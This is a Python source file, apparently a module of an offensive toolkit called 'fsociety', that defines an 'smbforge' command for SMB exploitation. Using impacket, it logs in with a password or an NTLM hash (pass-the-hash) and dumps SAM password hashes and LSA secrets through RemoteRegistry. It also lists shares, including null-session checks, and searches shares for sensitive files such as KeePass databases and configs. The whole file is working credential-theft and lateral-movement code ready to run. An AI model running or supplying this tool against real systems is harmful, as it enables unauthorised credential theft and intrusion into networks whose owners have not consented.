from __future__ import annotations
import os
import sys
import subprocess
import importlib.util
from pathlib import Path

from fsociety.core.base import tool
from fsociety.core.logger import Log

try:
    from impacket.smbconnection import SMBConnection
    from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False

@tool("smbforge", "SMB exploitation, credential dumping, and lateral movement", category="network")
class SMBForge:
    @staticmethod
    def build_parser(p):
        sub = p.add_subparsers(dest="cmd", required=True)

        dump = sub.add_parser("secretsdump", help="Dump SAM and LSA secrets via SMB")
        dump.add_argument("target")
        dump.add_argument("-u", "--user", required=True)
        dump.add_argument("-p", "--password", default="")
        dump.add_argument("-H", "--hash", help="NTLM hash (LM:NT or NT only)")
        dump.add_argument("-d", "--domain", default="")

        shares = sub.add_parser("shares", help="List SMB shares (Null Session test)")
        shares.add_argument("target")
        shares.add_argument("-u", "--user", default="")
        shares.add_argument("-p", "--password", default="")
        shares.add_argument("-d", "--domain", default="")

        spider = sub.add_parser("spider", help="Spider accessible shares for files")
        spider.add_argument("target")
        spider.add_argument("-u", "--user", required=True)
        spider.add_argument("-p", "--password", default="")
        spider.add_argument("-d", "--domain", default="")
        spider.add_argument("--pattern", default=".txt,.doc,.pdf,.kdbx,.config,.xml,.ps1,.bat")

    @staticmethod
    def _get_conn(target, user, password, domain, nt_hash, log):
        if not IMPACKET_AVAILABLE:
            log.err("impacket is not installed. (pip install impacket)")
            return None
        try:
            conn = SMBConnection(target, target, timeout=10)
            if nt_hash:
                lmhash, nthash = nt_hash.split(":") if ":" in nt_hash else ("", nt_hash)
                conn.login(user, "", domain, lmhash, nthash)
            else:
                conn.login(user, password, domain)
            return conn
        except Exception as e:
            log.err(f"Connection failed: {e}")
            return None

    @staticmethod
    def _secretsdump(args, log):
        conn = SMBForge._get_conn(args.target, args.user, args.password, args.domain, args.hash, log)
        if not conn: return 1
        try:
            log.info("Dumping SAM and LSA secrets via RemoteRegistry...")
            remote_ops = RemoteOperations(conn, False)
            remote_ops.enableRegistry()
            boot_key = remote_ops.getHBootKey()

            sam = SAMHashes(boot_key, args.target, isRemote=True)
            sam.dump()
            sam.export("sam_dump")

            lsa = LSASecrets(boot_key, remote_ops, isRemote=True)
            lsa.dumpSecrets()
            lsa.export("lsa_dump")

            remote_ops.finish()
            log.ok("Dump complete. Check sam_dump.* and lsa_dump.*")
            return 0
        except Exception as e:
            log.err(f"Dump failed: {e}")
            return 1

    @staticmethod
    def _shares(args, log):
        conn = SMBForge._get_conn(args.target, args.user, args.password, args.domain, None, log)
        if not conn: return 1
        log.info(f"Listing shares on {args.target}")
        try:
            for share in conn.listShares():
                name = share['shi1_netname'][:-1]
                comment = share['shi1_remark'][:-1]
                log.hit(f"Share: {name:<20} | {comment}")
            return 0
        except Exception as e:
            log.err(f"Failed: {e}")
            return 1

    @staticmethod
    def _spider(args, log):
        conn = SMBForge._get_conn(args.target, args.user, args.password, args.domain, None, log)
        if not conn: return 1
        patterns = [p.strip().lower() for p in args.pattern.split(",")]
        log.info(f"Spidering shares for extensions: {patterns}")
        try:
            for share in conn.listShares():
                share_name = share['shi1_netname'][:-1]
                if share_name.endswith('$') or share_name.upper() in ('IPC$', 'PRINT$'): continue
                try:
                    conn.connectTree(share_name)
                    for f in conn.listPath(share_name, '/*'):
                        name = f.get_longname()
                        if any(name.lower().endswith(pat) for pat in patterns):
                            log.hit(f"[{share_name}] {name} ({f.get_filesize()} bytes)")
                except Exception: continue
            return 0
        except Exception as e:
            log.err(f"Spider failed: {e}")
            return 1

    @staticmethod
    def run(args, log):
        if args.cmd == "secretsdump": return SMBForge._secretsdump(args, log)
        if args.cmd == "shares": return SMBForge._shares(args, log)
        if args.cmd == "spider": return SMBForge._spider(args, log)
        return 2
